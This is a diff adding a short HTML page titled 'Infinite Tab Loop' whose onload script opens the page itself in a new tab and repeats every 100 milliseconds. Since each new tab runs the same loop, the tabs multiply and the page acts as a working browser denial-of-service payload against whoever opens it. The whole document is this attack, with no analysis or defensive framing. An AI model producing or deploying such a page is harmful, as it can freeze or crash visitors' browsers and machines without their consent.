@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Infinite Tab Loop</title>
+    <script>
+        function openInfiniteTabs() {
+            // Opens the exact same file in a new tab
+            window.open(window.location.href, '_blank');
+            
+            // Runs the function again to open another tab
+            setTimeout(openInfiniteTabs, 100); 
+        }
+    </script>
+</head>
+<body onload="openInfiniteTabs()">
+    <h1>Opening tabs...</h1>
+</body>
+</html>
